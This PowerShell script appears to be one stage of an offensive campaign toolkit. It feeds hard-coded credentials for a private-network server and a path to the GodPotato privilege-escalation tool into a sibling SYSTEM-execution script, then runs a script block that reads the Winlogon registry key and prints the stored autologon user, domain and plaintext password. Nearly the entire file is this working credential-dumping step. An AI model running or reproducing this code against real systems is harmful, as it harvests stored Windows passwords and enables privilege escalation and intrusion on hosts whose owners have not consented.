[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Server = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$Username = "analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$GpPath = "C:\Windows\Temp\cadre-tools\GodPotato.exe"
)
$ErrorActionPreference = "Stop"

$script = @"
`$reg = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
`$wu = (Get-ItemProperty -Path `$reg -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
`$wp = (Get-ItemProperty -Path `$reg -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
`$wd = (Get-ItemProperty -Path `$reg -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
`$al = (Get-ItemProperty -Path `$reg -Name AutoAdminLogon -ErrorAction SilentlyContinue).AutoAdminLogon
Write-Output "WINLOGON_AUTOLOGON user=`$wu domain=`$wd auto=`$al"
if (`$wp) { Write-Output "WINLOGON_PASSWORD `$wp" }
"@

& "$PSScriptRoot\campaign-a-t043-system-exec.ps1" -Server $Server -Username $Username -Password $Password -GpPath $GpPath -ScriptBlock $script
